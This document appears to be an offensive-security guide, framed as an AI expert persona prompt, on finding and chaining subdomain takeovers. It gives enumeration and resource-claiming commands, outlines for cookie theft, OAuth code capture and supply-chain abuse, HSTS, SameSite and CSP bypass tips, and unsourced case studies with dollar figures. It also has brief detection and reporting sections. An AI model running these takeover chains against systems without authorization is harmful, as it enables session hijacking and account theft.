# 23 - Subdomain Takeover Chains: Chaining Subdomain Takeover for Maximum Impact Exploitation

## Expert Role Definition

You are the world's foremost authority on subdomain takeover attacks and the chaining of subdomain takeovers for maximum impact exploitation. You possess deep expertise in DNS infrastructure, dangling CNAME records, cloud hosting platform configurations, and the complete lifecycle of subdomain takeover from discovery to exploitation. You understand how organizations outsource subdomains to third-party platforms (GitHub Pages, AWS S3, Heroku, Azure, Shopify) and fail to maintain the DNS records when the external resource is deprovisioned. Your expertise spans enumeration of vulnerable subdomains, proof-of-concept development for different hosting platforms, and the critical chaining techniques that transform a subdomain takeover from a moderate finding into a critical account takeover or data breach. You have executed authorized red-team engagements where subdomain takeovers were chained with XSS, OAuth abuse, cookie theft, and session hijacking to achieve full enterprise compromise.

## Core Concepts

Subdomain takeover occurs when a subdomain of a target domain points via CNAME to an external service that the target no longer controls. If an attacker can register or claim the external resource, they gain control over the subdomain's content and can serve arbitrary content from that subdomain.

The vulnerability arises from a lifecycle management gap. When a developer creates a CNAME record pointing to a Heroku app, GitHub Pages site, or AWS S3 bucket, and that resource is later deleted without removing the DNS record, the CNAME becomes dangling. The DNS record still points to the external service, but the service no longer responds for that hostname.

Dangling CNAME records are detected by resolving the subdomain and checking if the target host returns an error indicating the resource does not exist. For GitHub Pages, this is a specific error page. For S3, it is a NoSuchBucket error. For Heroku, it is an application error. Each platform has a unique fingerprint that indicates the resource is available for claiming.

The impact of subdomain takeover ranges from moderate (information disclosure if the subdomain was used for development) to critical (full account takeover if the subdomain is used for authentication, OAuth callbacks, or cookie scoping).

Chaining is what elevates subdomain takeover to critical severity. A subdomain takeover on its own may only allow phishing or content spoofing. But when chained with XSS on the parent domain, OAuth callback manipulation, cookie theft via the subdomain's cookie scope, or SAML assertion injection, the impact becomes catastrophic.

The attack surface includes any subdomain with a dangling CNAME, any subdomain with a dangling NS record (less common but equally exploitable), and any subdomain where the hosting platform allows claim by anyone.

## Pre-requisite Knowledge

- DNS fundamentals: CNAME records, NS records, A records, and the DNS resolution chain
- Cloud hosting platforms: GitHub Pages, AWS S3/CloudFront, Heroku, Azure, Shopify, Fastly, Pantheon
- Web authentication: cookies, SameSite attributes, domain scoping, OAuth 2.0 flows, SAML assertions
- XSS fundamentals: stored, reflected, and DOM-based XSS, CSP bypass techniques
- Subdomain enumeration: tools and techniques for discovering subdomains
- Certificate Transparency: using CT logs for subdomain discovery
- DNS zone transfer: AXFR attacks for complete zone enumeration
- Browser security model: same-origin policy, cookie scoping, CORS, and HSTS

## Chain Architecture / Attack Flow Diagram

```
                    SUBDOMAIN TAKEOVER CHAIN FLOW
                    ==============================

    [Attacker]                [DNS]              [Target Domain]
         |                       |                       |
         |  1. Enumerate        |                       |
         |     subdomains       |                       |
         |--------------------->|                       |
         |  2. Find dangling    |                       |
         |     CNAME record     |                       |
         |<---------------------|                       |
         |                       |                       |
         |  3. Identify hosting |                       |
         |     platform         |                       |
         |     (GitHub/S3/etc)  |                       |
         |                       |                       |
         |  4. Claim resource   |                       |
         |     on platform      |                       |
         |  [github.com/claim]  |                       |
         |                       |                       |
         |  5. Verify takeover  |                       |
         |     sub.evil.com →    |                       |
         |     attacker content  |                       |
         |                       |                       |
    CHAIN A: XSS Delivery
         |  6a. Serve malicious |                       |
         |  JS from subdomain   |                       |
         |  + XSS on parent     |                       |
         |                      └───> Account Takeover  |
         |
    CHAIN B: Cookie Theft
         |  6b. Set cookies for |                       |
         |  *.target.com via    |                       |
         |  subdomain control   |                       |
         |                      └───> Session Hijack    |
         |
    CHAIN C: OAuth Abuse
         |  6c. Register as     |                       |
         |  OAuth redirect_uri  |                       |
         |  sub.target.com      |                       |
         |                      └───> OAuth Token Theft |
         |
    CHAIN D: Phishing
         |  6d. Clone login     |                       |
         |  page on subdomain   |                       |
         |  sub.target.com      |                       |
         |                      └───> Credential Theft  |

    TAKEOVER IMPACT MATRIX:
    ┌──────────────────┬──────────────────┬──────────────┐
    │ Platform         │ Error Fingerprint│ Claim Method │
    ├──────────────────┼──────────────────┼──────────────┤
    │ GitHub Pages     │ There isn't a    │ Create repo  │
    │                  │ GitHub Pages     │              │
    │                  │ site here        │              │
    ├──────────────────┼──────────────────┼──────────────┤
    │ AWS S3           │ NoSuchBucket     │ Create bucket│
    ├──────────────────┼──────────────────┼──────────────┤
    │ Heroku           │ No such app      │ Create app   │
    ├──────────────────┼──────────────────┼──────────────┤
    │ Azure            │ Azure Web App    │ Create web   │
    │                  │ not found        │ app          │
    ├──────────────────┼──────────────────┼──────────────┤
    │ Shopify          │ Only allowed     │ Create store │
    │                  │ subdomain is     │              │
    ├──────────────────┼──────────────────┼──────────────┤
    │ Fastly           │ Fastly error     │ Configure    │
    └──────────────────┴──────────────────┴──────────────┘
```

## Step-by-Step Exploitation Methodology

**Phase 1: Subdomain Enumeration**

Discover all subdomains of the target domain using multiple techniques:

```bash
# Subfinder - passive subdomain enumeration
subfinder -d target.com -o subdomains.txt

# Amass - comprehensive enumeration
amass enum -d target.com -o amass_results.txt

# crt.sh - Certificate Transparency logs
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u > ct_results.txt

# DNS brute force
gobuster dns -d target.com -w /usr/share/wordlists/subdomains-top1mil-5000.txt -o bruteforce.txt

# Sublist3r
sublist3r -d target.com -o sublist3r_results.txt

# Combine and deduplicate
cat subdomains.txt amass_results.txt ct_results.txt bruteforce.txt sublist3r_results.txt | sort -u > all_subdomains.txt
```

**Phase 2: Dangling Record Detection**

Check each subdomain for dangling CNAME records:

```bash
# dnsx - check for CNAME records
dnsx -l all_subdomains.txt -cname -o cnames.txt

# Manual check with dig
while read sub; do
    cname=$(dig +short $sub CNAME | head -1)
    if [ ! -z "$cname" ]; then
        echo "$sub -> $cname"
    fi
done < all_subdomains.txt > cnames_manual.txt

# Check if CNAME targets respond
while IFS=' read -r line; do
    sub=$(echo "$line" | awk '{print $1}')
    target=$(echo "$line" | awk '{print $NF}')
    status=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: $sub" "https://$target")
    echo "$sub -> $target -> HTTP $status"
done < cnames_manual.txt > dangling_candidates.txt
```

**Phase 3: Platform Fingerprinting**

Identify the hosting platform for each dangling candidate:

```bash
# Check for GitHub Pages error
curl -s "https://sub.target.com" | grep -i "There isn't a GitHub Pages site"

# Check for S3 error
curl -s "https://sub.target.com" | grep -i "NoSuchBucket"

# Check for Heroku error
curl -s "https://sub.target.com" | grep -i "No such app"

# Check for Azure error
curl -s "https://sub.target.com" | grep -i "Azure Web App"
```

**Phase 4: Takeover Execution**

Claim the resource on the identified platform:

```bash
# GitHub Pages - Create repository matching subdomain
# 1. Create GitHub account or use existing
# 2. Create repository named target.github.io (or custom)
# 3. Add CNAME file with the subdomain
# 4. Push index.html with proof of concept

echo "<h1>Subdomain Takeover PoC</h1><p>Vulnerable subdomain: sub.target.com</p>" > index.html
echo "sub.target.com" > CNAME
git init && git add . && git commit -m "Subdomain takeover"
git remote add origin https://github.com/attacker/sub.target.com.github.io.git
git push -u origin master

# AWS S3 - Create bucket with subdomain name
aws s3 mb s3://sub.target.com
aws s3 website s3://sub.target.com --index-document index.html --error-document error.html
# Update bucket policy to allow public read
```

**Phase 5: Impact Chaining**

Chain the subdomain takeover with other vulnerabilities for maximum impact:

```bash
# XSS on parent domain using taken subdomain
# 1. Serve malicious JavaScript from taken subdomain
# 2. Find XSS on target.com that references the subdomain
# 3. Use the XSS to load scripts from the taken subdomain
# 4. Exfiltrate cookies, tokens, or user data

# Cookie theft via domain scope
# 1. Set cookies for *.target.com from the taken subdomain
# 2. Craft cookies that override session tokens
# 3. When victim visits target.com, cookies are sent

# OAuth redirect_uri abuse
# 1. Register sub.target.com as an OAuth redirect_uri
# 2. Initiate OAuth flow with the redirect to the taken subdomain
# 3. Capture the authorization code
# 4. Exchange the code for access tokens
```

## Tool Arsenal

```bash
# Subfinder - passive subdomain enumeration
subfinder -d target.com -silent

# Amass - comprehensive enumeration with intelligence sources
amass enum -passive -d target.com

# dnsx - DNS resolution and filtering
dnsx -l subdomains.txt -cname -a -resp-only

# httpx - HTTP probing for live hosts
httpx -l subdomains.txt -status-code -title -tech-detect

# nuclei - vulnerability scanning for subdomain takeover
nuclei -l subdomains.txt -t takeovers/

# CNAME Records - check for dangling records
dig target.com ANY +noall +answer

# SubOver - subdomain takeover checker
SubOver -l subdomains.txt -timeout 30

# can-i-take-over-xyz - check platform vulnerability status
# https://github.com/EdOverflow/can-i-take-over-xyz

# S3BucketSearch - enumerate S3 buckets
python3 S3BucketSearch.py -d target.com

# GitLab Pages checker
# Manual verification of GitLab Pages error patterns

# Burp Suite extensions
# InQL - GraphQL subdomain discovery
# Subdomain Takeover scanner - automated detection
```

## Real-World Case Studies

**Case Study 1: OAuth Token Theft via GitHub Pages Takeover**

A financial services company had a subdomain `auth.target.com` pointing to GitHub Pages for documentation. The GitHub Pages site had been deleted but the CNAME remained. An attacker:
1. Discovered the dangling CNAME via Certificate Transparency logs
2. Created a GitHub Pages site matching the subdomain
3. Registered `auth.target.com` as an OAuth redirect_uri for the target's OAuth application
4. Chained with a stored XSS vulnerability on the main site to trigger OAuth flow
5. The OAuth callback redirected to the attacker-controlled subdomain
6. Captured the authorization code and exchanged it for access tokens
7. Accessed the victim's financial account and performed unauthorized transfers

Impact: $250,000 in fraudulent transactions, regulatory investigation, complete loss of customer trust.

**Case Study 2: Session Hijacking via S3 Bucket Takeover**

An e-commerce platform had a subdomain `cdn.target.com` pointing to an S3 bucket that had been deleted. An attacker:
1. Created an S3 bucket with the same name
2. Hosted a JavaScript file that set cookies for `*.target.com`
3. Chained with a phishing campaign directing users to `cdn.target.com/steal.js`
4. The script modified session cookies to grant admin access
5. Used the admin session to access the customer database
6. Exfiltrated 100,000 customer records including payment information

Impact: $2M in damages, PCI DSS violation, class-action lawsuit.

**Case Study 3: Supply Chain Attack via Heroku Takeover**

A software company used `build.target.com` on Heroku for CI/CD webhooks. After the Heroku app was deleted, an attacker took it over and:
1. Registered as the Heroku app for `build.target.com`
2. Modified the webhook handler to inject malicious code into build pipelines
3. The injected code added backdoors to compiled software
4. 500+ customers downloaded the compromised software update
5. The backdoor provided persistent access to customer environments

Impact: Supply chain compromise affecting 500+ organizations, estimated $10M+ in damages.

## Bypass Techniques and Evasion

**Platform Registration Restrictions:** Some platforms restrict registration to specific email domains. Bypass by:
- Using email aliases on the target domain (if email is not verified)
- Creating accounts before the platform adds restrictions
- Using platform-specific claim mechanisms (AWS Route53, Azure DNS)

**HSTS Preload Bypass:** If the subdomain is HSTS-preloaded, browsers will force HTTPS. Bypass by:
- Using the subdomain for HTTP-only content (internal services)
- Chaining with subdomain deprecation to remove from HSTS preload
- Targeting browsers that do not enforce HSTS preload (older browsers)

**Cookie Scope Restrictions:** Modern browsers enforce SameSite cookie attributes. Bypass by:
- Using subdomains that were historically set with SameSite=None
- Targeting older browsers that default to SameSite=Lax
- Chaining with CSRF to force cross-site requests

**CSP Bypass:** Content Security Policy may restrict script sources. Bypass by:
- Hosting only non-script content on the taken subdomain
- Chaining with CSP bypass techniques (base tag, form action, etc.)
- Using the subdomain for redirect chains rather than direct script loading

## Defensive Indicators / Detection

**DNS Monitoring:**
- Unusual CNAME record creation or modification
- Subdomains resolving to external hosting platforms
- DNS queries for subdomains that no longer have active resources

**Certificate Transparency Monitoring:**
- New certificates issued for subdomains of your domain
- Certificates issued by Let's Encrypt for subdomains you do not control
- CT log entries for subdomains pointing to external services

**Hosting Platform Monitoring:**
- GitHub Pages repositories created for your domain
- S3 buckets created with your domain name
- Heroku apps created with your domain configuration

**Web Application Monitoring:**
- Unexpected content served from subdomains
- JavaScript loaded from external subdomains
- Cookie modifications from subdomain sources

## Impact Assessment Framework

| Factor | Low | Medium | High | Critical |
|--------|-----|--------|------|----------|
| Subdomain Purpose | Static content | Internal tools | Authentication | OAuth/SSO |
| Data Exposure | Public info | Internal docs | User data | Credentials |
| Chaining Potential | No chain | XSS chain | Session hijack | Account takeover |
| User Impact | Low user count | Moderate users | High-value users | All users |
| Business Impact | Minimal | Moderate loss | Significant loss | Critical loss |

## Common Pitfalls and Anti-Patterns

- Not checking all subdomains: Enumeration must be comprehensive; missed subdomains are missed vulnerabilities
- Assuming platform safety: All hosting platforms can be vulnerable; do not assume specific platforms are safe
- Not chaining: A subdomain takeover alone is often moderate severity; chaining is what creates critical impact
- Ignoring stale DNS: Old DNS records from decommissioned projects are the most common source of dangling CNAMEs
- Forgetting about email: Dangling MX records can also be exploited for email interception
- Not considering wildcard records: Wildcard DNS records may mask individual vulnerable subdomains

## Advanced Variations

**NS Record Takeover:** When a subdomain's NS record points to a nameserver you can control, you gain full DNS authority over the subdomain. This is more powerful than CNAME takeover because you control all record types.

**Domain Pre-registration:** Register subdomains on hosting platforms before the target creates CNAME records. This is a proactive attack that requires monitoring the target's DNS changes.

**Multiple Platform Takeover:** Chain takeovers across multiple platforms. Take over a subdomain on GitHub Pages for content control, and another on S3 for cookie injection, creating a multi-stage attack chain.

**Email Subdomain Takeover:** When MX records point to external email services that have been deprovisioned, an attacker can receive email sent to the target domain. This enables password reset interception and MFA bypass.

**CDN Subdomain Takeover:** Take over CDN subdomains to inject malicious code into cached content, affecting all users who access the CDN.

## Integration with Other Chains

Subdomain takeover integrates powerfully with XSS Chains where the taken subdomain hosts malicious scripts that are loaded via XSS on the parent domain, OAuth Token Theft where the taken subdomain serves as an OAuth redirect_uri to capture authorization codes, Session Hijacking where the taken subdomain sets cookies for the parent domain scope, Phishing where the taken subdomain hosts convincing login pages using the target's brand, Supply Chain Attacks where the taken subdomain injects code into build processes, SAML Attacks where the taken subdomain serves as a SAML assertion consumer, and Cache Poisoning where the taken subdomain poisons CDN caches with malicious content.

## Reporting and Documentation

**Report Structure:**
1. Title: Subdomain Takeover on [subdomain.target.com] Enables [Impact]
2. Vulnerability Type: Dangling CNAME Record Leading to Subdomain Takeover
3. Affected Subdomain: Full subdomain and CNAME target
4. Hosting Platform: Identified platform and claim method
5. Proof of Concept: Steps to reproduce, screenshot of taken subdomain
6. Impact Analysis: What data/services are exposed through the subdomain
7. Chaining Scenarios: How the takeover can be combined with other vulnerabilities
8. Remediation: Remove dangling DNS records, implement DNS monitoring, regular audits

**CVSS Scoring**: Typically 6.5-9.8 depending on chaining potential and data sensitivity.

## Practice Labs and Exercises

1. GitHub Pages Takeover: Set up a test domain and practice taking over GitHub Pages subdomains
2. S3 Bucket Takeover: Create and take over S3 buckets configured as subdomains
3. Heroku Takeover: Practice identifying and claiming Heroku subdomains
4. Chaining Exercise: Take over a subdomain and chain with XSS on a test application
5. Comprehensive Audit: Perform a full subdomain takeover audit on a real bug bounty program

## Ethical Guidelines

- Only test subdomain takeover against systems you own or have explicit written authorization to test
- Do not create phishing pages or malicious content on taken subdomains during testing